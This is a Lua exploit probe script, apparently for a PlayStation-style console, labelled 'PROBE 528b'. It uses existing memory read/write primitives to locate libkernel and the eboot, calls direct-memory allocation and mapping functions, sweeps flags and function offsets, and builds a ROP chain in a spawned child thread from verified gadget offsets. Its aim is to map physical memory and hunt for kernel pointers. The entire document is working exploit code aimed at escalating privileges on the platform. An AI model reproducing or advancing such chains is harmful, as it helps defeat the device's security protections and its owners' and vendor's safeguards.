-- CRASH_CLASS: MODERATE
-- PROBE 528b: MapDirectMemory — fixed (no XO reads)
--
-- 528a died reading libkernel .text (XO / execute-only).
-- This version removes ALL libkernel text reads.
--
-- Strategy:
--   [A] AllocateDirectMemory via fcall (known working, DEM9N101 confirmed)
--   [B] Try MapDirectMemory via fcall_with_rax (6-arg, multiple flag combos)
--       fcall_with_rax controls rdi,rsi,rdx,rcx,r8,r9 — full 6 register args.
--       If +0x15020 is the 6-arg variant, one flag combo should work.
--       If it's the 7-arg named variant, the missing stack arg may crash — pcall guards.
--   [C] Scan nearby offsets for an alternate mapping function
--   [D] ROP chain fallback: thr_new child calls wrapper with 7th arg on stack
--   [E] If mapped, read the physical page

print("=== PROBE 528b: MAP DIRECT MEMORY (fixed) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b, n) for o = 0, n - 4, 4 do wd(b + o, 0) end end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS + SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- ============================================================
-- Get eboot base (handle 0)
-- ============================================================
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", thi, tlo))
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off) return eboot + uint64(off) end

-- ============================================================
-- Get libkernel base (handle 0x2001, fallback scan)
-- ============================================================
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end

if lk_lo == 0 and lk_hi == 0 then
    print("handle 0x2001 empty, scanning 0-0x100...")
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name = ""
            for i = 0, 31 do
                local b = rd(N(ib3) + 8 + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                    if c >= 32 and c < 127 then name = name .. string.char(c) end
                end
            end
            if name:find("libkernel") then
                lk_lo = rd(N(ib3) + 0x108) or 0
                lk_hi = rd(N(ib3) + 0x10C) or 0
                if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
                if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
                print(string.format("  found libkernel at h=0x%X", h))
                break
            end
        end
    end
end

if lk_lo == 0 and lk_hi == 0 then
    print("FAIL: libkernel not found"); return
end
print(string.format("libkernel_text=0x%X%08X", lk_hi, lk_lo))

local lk_text = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local function lkaddr(off) return lk_text + uint64(off) end

-- ============================================================
-- [A] AllocateDirectMemory via fcall (known working)
-- ============================================================
print("")
print("[A] sceKernelAllocateDirectMemory")

local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))

local alloc_fn = lkaddr(0x17EF0)
local ok_a, alloc_rv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0),              -- searchStart
        uint64(0x10000000),     -- searchEnd (256MB)
        uint64(0x4000),         -- len (16KB page)
        uint64(0x4000),         -- alignment
        uint64(0),              -- memoryType
        uint64(N(phys_out)))    -- &physOut
end)

if not ok_a then print("  AllocateDirectMemory CRASHED"); return end
print("  ret=" .. N(alloc_rv))
local phys_addr = rq(N(phys_out))
print("  phys=" .. fmt(phys_addr))

if not phys_addr or N(alloc_rv) ~= 0 then
    print("  FAILED — cannot continue without physical memory")
    return
end

local ph, pl = get_hi_lo(phys_addr)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end
if ph == 0 and pl < 0x1000 then
    print("  phys looks like zero/error — abort")
    return
end
print("  ALLOCATED physical memory OK")

if not alive() then print("DIED after alloc"); return end

-- ============================================================
-- [B] Try MapDirectMemory via fcall_with_rax (6-arg, flag sweep)
-- ============================================================
print("")
print("[B] sceKernelMapDirectMemory via fcall (6-arg flag sweep)")
print("  signature: (&addr, len, prot, flags, physAddr, alignment)")

local map_fn = lkaddr(0x15020)
local map6_ok = false
local mapped_va = nil

local flags_list = {0, 1, 2, 0x10, 0x12, 0x100, 0x412, 0x1000, 0x10002, 0x80000, 0x10412, 0x40000}
for _, flags in ipairs(flags_list) do
    local virt_out = memory.alloc(8)
    wq(N(virt_out), uint64(0))

    local ok_m, rv_m = pcall(function()
        return native.fcall_with_rax(map_fn, 0,
            uint64(N(virt_out)),  -- rdi = &addr
            uint64(0x4000),       -- rsi = len
            uint64(3),            -- rdx = PROT_READ|PROT_WRITE
            uint64(flags),        -- rcx = flags
            uint64(N(phys_addr)), -- r8  = physAddr
            uint64(0x4000))       -- r9  = alignment
    end)

    if not alive() then
        print(string.format("  flags=0x%X: KILLED process", flags))
        return
    end

    if ok_m then
        local rv = N(rv_m)
        local va = rq(N(virt_out))
        if rv == 0 and va then
            local vah, val_ = get_hi_lo(va)
            if vah < 0 then vah = vah + 0x100000000 end
            if val_ < 0 then val_ = val_ + 0x100000000 end
            if vah ~= 0 or val_ > 0x1000 then
                print(string.format("  *** flags=0x%X: MAP SUCCESS rv=0 va=%s ***", flags, fmt(va)))
                map6_ok = true
                mapped_va = va
                break
            end
        end
        if rv ~= 0 then
            local rv_u = rv
            if rv_u < 0 then rv_u = rv_u + 0x100000000 end
            if rv_u ~= 0xFFFFFFFF then
                print(string.format("  flags=0x%X: rv=0x%X va=%s", flags, rv_u, fmt(va)))
            end
        end
    end
end

if not map6_ok then
    print("  no flag combo worked at +0x15020")
end

if not alive() then print("DIED during flag sweep"); return end

-- ============================================================
-- [C] Scan nearby offsets for alternate mapping function
-- ============================================================
if not map6_ok then
    print("")
    print("[C] scanning +0x14000..+0x18000 for 6-arg mapping function")

    local scan_start = 0x14000
    local scan_end = 0x18000
    local tested = 0

    for test_off = scan_start, scan_end, 0x10 do
        if test_off == 0x15020 then
            -- already tried this one with multiple flags
        else
            local fn = lkaddr(test_off)
            local virt_out = memory.alloc(8)
            wq(N(virt_out), uint64(0))

            local ok_s, rv_s = pcall(function()
                return native.fcall_with_rax(fn, 0,
                    uint64(N(virt_out)),
                    uint64(0x4000),
                    uint64(3),
                    uint64(0),
                    uint64(N(phys_addr)),
                    uint64(0x4000))
            end)

            if not alive() then
                print(string.format("  +0x%05X: KILLED", test_off))
                return
            end

            tested = tested + 1
            if ok_s then
                local rv = N(rv_s)
                local va = rq(N(virt_out))
                if rv == 0 and va then
                    local vah, val_ = get_hi_lo(va)
                    if vah < 0 then vah = vah + 0x100000000 end
                    if val_ < 0 then val_ = val_ + 0x100000000 end
                    if vah ~= 0 or val_ > 0x1000 then
                        print(string.format("  *** +0x%05X: MAP SUCCESS va=%s ***", test_off, fmt(va)))
                        map6_ok = true
                        mapped_va = va
                        break
                    end
                end
            end
        end
    end

    if not map6_ok then
        print(string.format("  tested %d offsets, no 6-arg mapping found", tested))
    end
end

if not alive() then print("DIED during offset scan"); return end

-- ============================================================
-- [D] ROP chain fallback: thr_new child calls wrapper with 7th arg
-- ============================================================
if not map6_ok then
    print("")
    print("[D] MapDirectMemory via child ROP chain (7-arg)")

    local sc455 = mk(455)
    local sc_mmap = mk(477)

    -- Gadgets (verified in probes 271g/384b)
    local G = {
        pop_rax  = 0x992,
        pop_rdi  = 0xC9DFE,
        pop_rsi  = 0xD77D,
        pop_rdx  = 0x3B02D7,
        pop_rcx  = 0xE64,
        mov_m_rax = 0x92C67,
        bare_ret = 0x42,
    }

    -- Verify key gadgets by reading eboot (RX, safe to read)
    print("  verifying eboot gadgets...")
    local function vg(name, off, expect_lo, nbytes)
        local d = rd(N(eboot) + off)
        if d == nil then print("  " .. name .. ": UNREADABLE"); return false end
        if d < 0 then d = d + 0x100000000 end
        local mask = 0
        for i = 0, nbytes - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
        local got = d % (mask + 1)
        if got ~= expect_lo then
            print(string.format("  %s: MISMATCH got=0x%X want=0x%X", name, got, expect_lo))
            return false
        end
        return true
    end

    local gok = true
    gok = vg("pop_rax", G.pop_rax, 0xC358, 2) and gok
    gok = vg("pop_rdi", G.pop_rdi, 0xC35F, 2) and gok
    gok = vg("pop_rsi", G.pop_rsi, 0xC35E, 2) and gok
    gok = vg("pop_rdx", G.pop_rdx, 0xC35A, 2) and gok
    gok = vg("pop_rcx", G.pop_rcx, 0xC359, 2) and gok
    gok = vg("mov_m_rax", G.mov_m_rax, 0xC3078948, 4) and gok
    gok = vg("bare_ret", G.bare_ret, 0xC3, 1) and gok

    if not gok then
        print("  gadget verification failed, trying alt pop_rdi at +0x75DFE")
        if vg("pop_rdi_alt", 0x75DFE, 0xC35F, 2) then
            G.pop_rdi = 0x75DFE
            print("  using alt pop_rdi")
        else
            print("  ABORT: gadgets not found")
            return
        end
    end

    if not alive() then print("DIED verifying gadgets"); return end

    -- Allocate fresh phys memory for this attempt
    local phys_out2 = memory.alloc(8)
    wq(N(phys_out2), uint64(0))
    local ok_a2, alloc_rv2 = pcall(function()
        return native.fcall_with_rax(alloc_fn, 0,
            uint64(0), uint64(0x10000000), uint64(0x4000),
            uint64(0x4000), uint64(0), uint64(N(phys_out2)))
    end)
    local phys2 = rq(N(phys_out2))
    if not ok_a2 or N(alloc_rv2) ~= 0 then
        print("  second alloc failed, reusing first")
        phys2 = phys_addr
    end
    print("  phys2=" .. fmt(phys2))

    if not alive() then print("DIED after alloc2"); return end

    -- Allocate child stack (2 MiB)
    local stack_sz = 0x200000
    local cstack = sc_mmap(uint64(0), uint64(stack_sz), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    print("  child stack=" .. fmt(cstack))
    if not cstack or N(cstack) == 0 then
        print("  mmap for child stack failed"); return
    end

    -- Result buffer and virt_out for MapDirectMemory
    local result = memory.alloc(0x40)
    z(result, 0x40)
    wq(N(result), uint64(0xAAAABBBBCCCCDDDD))  -- sentinel
    local virt_out_c = memory.alloc(8)
    wq(N(virt_out_c), uint64(0))

    -- Fake TCB (self-referencing 4KB buffer)
    local tcb = memory.alloc(0x1000)
    z(tcb, 0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), uint64(N(tcb)))

    -- Build ROP chain at top of child stack
    -- thr_new(455) sets RSP = stack_base + stack_size (per thr_param).
    -- We place the chain data at the top and set stack_size so RSP lands there.
    -- start_func = bare_ret → first "ret" pops chain[0] into RIP.

    local chain_room = 0x1000  -- 4KB for chain
    local chain_base = N(cstack) + stack_sz - chain_room
    local pos = chain_base

    local function emit(val)
        wq(uint64(pos), val)
        pos = pos + 8
    end

    -- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr) for errno safety
    -- sysarch is syscall 165: rax=165, rdi=129, rsi=&tcb_ptr
    -- Use stub (syscall.pipe.fn_addr) as the syscall executor.
    -- stub expects rax = syscall number, then does syscall;ret.
    emit(eaddr(G.pop_rax))
    emit(uint64(165))              -- rax = SYS_sysarch
    emit(eaddr(G.pop_rdi))
    emit(uint64(129))              -- rdi = I386_SET_FSBASE (works on amd64 too)
    emit(eaddr(G.pop_rsi))
    emit(uint64(N(tcb_ptr)))       -- rsi = &tcb_ptr
    emit(stub)                     -- syscall;ret

    -- Step 2: set up regs for MapDirectMemory wrapper call
    -- MapNamedDirectMemory(void**addr, size_t len, int prot, int flags,
    --                       off_t physStart, size_t align, const char *name)
    -- rdi=&addr, rsi=len, rdx=prot, rcx=flags
    -- r8=physStart, r9=align → we cannot set these via gadgets (no pop r8/r9)
    -- 7th arg (name) goes at [RSP+8] after the function's own return address
    --
    -- We control rdi,rsi,rdx,rcx via gadgets.
    -- r8/r9 will hold whatever sysarch left.
    -- The function may still work if the underlying syscall only uses 4 regs
    -- and reads physStart/align from the stack or from an internal struct.
    --
    -- But actually, PS4 SDK shows the 6-arg variant reads physStart as arg5 (r8)
    -- and alignment as arg6 (r9). Without pop r8/r9, those are garbage.
    --
    -- TRICK: Use two sequential calls:
    --   First call: a dummy fcall_with_rax from MAIN thread sets r8/r9, then
    --               the child inherits... no, child has its own registers.
    --
    -- ALTERNATIVE: Find mov r8, <reg>; ret gadgets. Or:
    -- Use a call to a function that returns a value in r8/r9 as side effect.
    -- Or: use stub to do a syscall whose return doesn't clobber r8/r9,
    --     but syscall ABI clobbers rcx and r11, not r8/r9.
    --     So BETWEEN sysarch and the wrapper call, r8/r9 still hold whatever
    --     sysarch put there. sysarch(165) is a simple call that probably
    --     doesn't touch r8/r9 internally.
    --
    -- PRAGMATIC: try calling the wrapper with garbage r8/r9 first.
    -- If it fails, try a second approach where we set up the args
    -- as a raw syscall instead (if we can identify the syscall number).

    emit(eaddr(G.pop_rdi))
    emit(uint64(N(virt_out_c)))    -- rdi = &addr_out
    emit(eaddr(G.pop_rsi))
    emit(uint64(0x4000))           -- rsi = len
    emit(eaddr(G.pop_rdx))
    emit(uint64(3))                -- rdx = PROT_READ|PROT_WRITE
    emit(eaddr(G.pop_rcx))
    emit(uint64(0))                -- rcx = flags (try 0 first)

    -- "ret" into MapDirectMemory wrapper
    -- When CPU executes "ret", it pops [RSP] → RIP = MapDirectMemory.
    -- RSP now points to the NEXT word. MapDirectMemory sees:
    --   [RSP+0] = return address (where to go when it returns)
    --   [RSP+8] = 7th argument (name)
    emit(lkaddr(0x15020))

    -- What MapDirectMemory sees on the stack at entry:
    local after_call = pos + 16  -- skip return_addr + 7th_arg slots
    -- Compute after_call as a uint64
    local after_call_hi = math.floor(after_call / 0x100000000)
    local after_call_lo = after_call % 0x100000000
    local after_call_u = uint64(string.format("0x%X%08X", after_call_hi, after_call_lo))

    emit(after_call_u)             -- [RSP+0] = return address (resume chain)
    emit(uint64(0))                -- [RSP+8] = name = NULL (7th arg)
    -- After return, RSP points here (after_call):

    -- Step 3: store rax (MapDirectMemory return value) to result buffer
    emit(eaddr(G.pop_rdi))
    emit(uint64(N(result)))
    emit(eaddr(G.mov_m_rax))      -- result[0] = rax

    -- Step 4: thr_exit(431)
    emit(eaddr(G.pop_rax))
    emit(uint64(431))              -- rax = SYS_thr_exit
    emit(eaddr(G.pop_rdi))
    emit(uint64(0))                -- rdi = 0 (exit status)
    emit(stub)                     -- syscall;ret

    local chain_len = pos - chain_base
    print(string.format("  chain: %d bytes at 0x%X", chain_len, chain_base))

    -- Set up thr_param
    -- start_func = bare_ret gadget (pops first chain word into RIP)
    -- stack_size adjusted so RSP = chain_base
    -- RSP = stack_base + stack_size, so stack_size = chain_base - cstack
    local child_stack_size = chain_base - N(cstack)

    local param = memory.alloc(0x40)
    z(param, 0x40)
    wq(N(param) + 0x00, eaddr(G.bare_ret))        -- start_func
    wq(N(param) + 0x08, uint64(0))                 -- arg (unused)
    wq(N(param) + 0x10, cstack)                    -- stack_base
    wq(N(param) + 0x18, uint64(child_stack_size))  -- stack_size → RSP = chain_base
    local tid_p = memory.alloc(8)
    wq(N(tid_p), uint64(0))
    wq(N(param) + 0x30, uint64(N(tid_p)))          -- child_tid

    print("  launching child thread (attempt 1: flags=0, r8/r9 uncontrolled)...")
    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)
    print("  thr_new ret=" .. (ok_t and tostring(N(ret_t)) or "FAIL"))

    -- Wait for child to finish
    local x = 0; for k = 1, 300000 do x = x + k end

    if not alive() then
        print("  PROCESS DIED — MapDirectMemory crashed in child")
        return
    end

    local child_tid = rq(N(tid_p))
    print("  child_tid=" .. fmt(child_tid))
    local map_rv_raw = rq(N(result))
    print("  MapDirectMemory rv=" .. fmt(map_rv_raw))
    local va_c = rq(N(virt_out_c))
    print("  mapped VA=" .. fmt(va_c))

    if map_rv_raw then
        local mr = N(map_rv_raw)
        if mr == 0 and va_c then
            local vah, val_ = get_hi_lo(va_c)
            if vah < 0 then vah = vah + 0x100000000 end
            if val_ < 0 then val_ = val_ + 0x100000000 end
            if vah ~= 0 or val_ > 0x1000 then
                print("  *** ROP MAP SUCCEEDED! ***")
                map6_ok = true
                mapped_va = va_c
            end
        end
    end

    -- If first attempt failed, retry with different flags via a fresh child
    if not map6_ok and alive() then
        local retry_flags = {0x10, 0x12, 1, 2, 0x412, 0x10002}
        for _, rf in ipairs(retry_flags) do
            print(string.format("  retry flags=0x%X...", rf))

            -- Rebuild chain with new flags value
            pos = chain_base
            -- sysarch
            emit(eaddr(G.pop_rax)); emit(uint64(165))
            emit(eaddr(G.pop_rdi)); emit(uint64(129))
            emit(eaddr(G.pop_rsi)); emit(uint64(N(tcb_ptr)))
            emit(stub)
            -- args
            emit(eaddr(G.pop_rdi)); emit(uint64(N(virt_out_c)))
            emit(eaddr(G.pop_rsi)); emit(uint64(0x4000))
            emit(eaddr(G.pop_rdx)); emit(uint64(3))
            emit(eaddr(G.pop_rcx)); emit(uint64(rf))
            -- call wrapper
            emit(lkaddr(0x15020))
            local ac2 = pos + 16
            local ac2_hi = math.floor(ac2 / 0x100000000)
            local ac2_lo = ac2 % 0x100000000
            emit(uint64(string.format("0x%X%08X", ac2_hi, ac2_lo)))
            emit(uint64(0))  -- name=NULL
            -- store result
            emit(eaddr(G.pop_rdi)); emit(uint64(N(result)))
            emit(eaddr(G.mov_m_rax))
            -- exit
            emit(eaddr(G.pop_rax)); emit(uint64(431))
            emit(eaddr(G.pop_rdi)); emit(uint64(0))
            emit(stub)

            -- Reset output
            wq(N(result), uint64(0xAAAABBBBCCCCDDDD))
            wq(N(virt_out_c), uint64(0))

            local ok_r, rv_r = pcall(function()
                return sc455(uint64(N(param)), uint64(0x38))
            end)

            x = 0; for k = 1, 300000 do x = x + k end

            if not alive() then
                print(string.format("  DIED with flags=0x%X", rf))
                return
            end

            local rv2 = rq(N(result))
            local va2 = rq(N(virt_out_c))
            print(string.format("  flags=0x%X: rv=%s va=%s", rf, fmt(rv2), fmt(va2)))

            if rv2 and N(rv2) == 0 and va2 then
                local vah2, val2 = get_hi_lo(va2)
                if vah2 < 0 then vah2 = vah2 + 0x100000000 end
                if val2 < 0 then val2 = val2 + 0x100000000 end
                if vah2 ~= 0 or val2 > 0x1000 then
                    print("  *** ROP MAP SUCCEEDED! ***")
                    map6_ok = true
                    mapped_va = va2
                    break
                end
            end
        end
    end
end

-- ============================================================
-- [E] Read mapped physical memory
-- ============================================================
if map6_ok and mapped_va then
    print("")
    print("[E] reading mapped physical memory")
    print("  VA=" .. fmt(mapped_va))
    for i = 0, 15 do
        local v = rq(N(mapped_va) + i * 8)
        if v then
            print(string.format("  [+0x%02X] = %s", i * 8, fmt(v)))
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vh >= 0xFFFF8000 then
                local exp = math.floor(vh / 0x100000) % 0x800
                if exp ~= 0x7FF then
                    print("    ^^^ KERNEL POINTER? ^^^")
                end
            end
        else
            print(string.format("  [+0x%02X] = FAULT", i * 8))
        end
    end

    -- Write test
    print("")
    print("  write test...")
    local magic = 0xCAFEBABE
    wd(N(mapped_va), magic)
    local readback = rd(N(mapped_va))
    print(string.format("  wrote 0x%X, read 0x%X, match=%s",
        magic, readback or 0, tostring(readback == magic)))
end

-- ============================================================
-- Summary
-- ============================================================
print("")
print("[SUMMARY]")
print("  phys=" .. fmt(phys_addr))
if map6_ok then
    print("  MAP OK va=" .. fmt(mapped_va))
else
    print("  MAP FAILED — no variant worked")
end
print("  alive=" .. tostring(alive()))
print("=== 528b COMPLETE ===")
